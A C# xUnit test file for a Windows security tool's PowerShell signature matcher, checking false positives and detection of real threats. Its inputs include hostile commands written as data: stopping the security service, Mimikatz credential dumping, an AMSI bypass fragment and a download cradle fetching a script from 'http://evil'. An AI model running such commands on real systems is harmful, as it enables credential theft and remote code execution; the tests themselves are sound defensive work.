using Xunit;
using Gnyida.Core;

namespace Gnyida.Tests
{
    /// <summary>
    /// Tests for the PowerShell script-block signature matching used by
    /// ScriptExecutionMonitor. The matching helpers are pure/I-O-free
    /// (InternalsVisibleTo Gnyida.Tests) so we can assert the signature set
    /// without reading the Windows event log or constructing the full monitor.
    /// </summary>
    public class ScriptExecutionMonitorTests
    {
        //  Self-referential "Gnyida" false positive is gone 

        [Fact]
        public void BenignScript_ReferencingGnyidaProgramData_DoesNotMatch()
        {
            // Previously matched the bare "Gnyida" substring and got its tree killed.
            var script = @"$log = ""$env:ProgramData\Gnyida\logs\run.log""; Write-Host ""Gnyida diagnostics complete""";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.Empty(matches);
            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void BenignScript_WithBareWordGnyida_DoesNotMatch()
        {
            var script = @"# This is the Gnyida push helper. It references Gnyida a lot.";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.Empty(matches);
            Assert.False(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        //  Genuine Gnyida service-tamper still escalates 

        [Fact]
        public void GnyidaServiceStop_StillMatchesAndIsCritical()
        {
            var script = @"Stop-Service Gnyida -Force";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void ScStopGnyida_StillMatchesAndIsCritical()
        {
            var script = @"sc.exe stop Gnyida";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        //  Genuine attack-tool signatures were NOT weakened 

        [Fact]
        public void Mimikatz_StillMatchesAndIsCritical()
        {
            var script = @"Invoke-Mimikatz -Command '""sekurlsa::logonpasswords""'";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void AmsiBypass_StillMatchesAndIsCritical()
        {
            var script = @"[Ref].Assembly.GetType('...').GetField('amsiInitFailed'); AmsiScanBuffer";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
            Assert.True(ScriptExecutionMonitor.IsCriticalScriptMatch(matches));
        }

        [Fact]
        public void DownloadCradle_StillMatches()
        {
            var script = @"IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')";
            var matches = ScriptExecutionMonitor.MatchMaliciousPatterns(script);
            Assert.NotEmpty(matches);
        }
    }
}
